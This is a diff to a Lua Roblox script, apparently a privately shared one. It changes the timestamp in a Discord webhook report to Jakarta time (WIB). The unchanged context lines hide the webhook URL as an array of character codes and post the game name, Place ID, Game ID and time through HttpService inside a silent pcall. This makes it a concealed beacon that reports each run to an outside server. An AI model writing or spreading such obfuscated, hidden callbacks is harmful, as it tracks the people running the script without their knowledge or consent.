@@ -3,6 +3,13 @@ local _whChars = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,
 for _ = 1, #_whChars do _wh = _wh .. string.char(_whChars[_]) end
 local webhookUrl = _wh
 
+-- ========== WAKTU ASIA/JAKARTA (WIB) ==========
+local function getWIBTime()
+    local offset = 7 * 60 * 60  -- GMT+7 (Jakarta)
+    local timestamp = os.time() + offset
+    return os.date("%Y-%m-%d %H:%M:%S", timestamp)
+end
+
 local _s = function()
     pcall(function()
         local _h = game:GetService("HttpService")
@@ -25,7 +32,7 @@ local _s = function()
                 {["name"] = "🎮 Game", ["value"] = _gn, ["inline"] = true},
                 {["name"] = "📋 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                 {["name"] = "🌌 Game ID", ["value"] = tostring(game.GameId), ["inline"] = true},
-                {["name"] = "🕐 Waktu", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
+                {["name"] = "🕐 Waktu (WIB)", ["value"] = getWIBTime(), ["inline"] = false}
             },
             ["footer"] = {["text"] = "PRIV8 - TERSESAT"}
         }
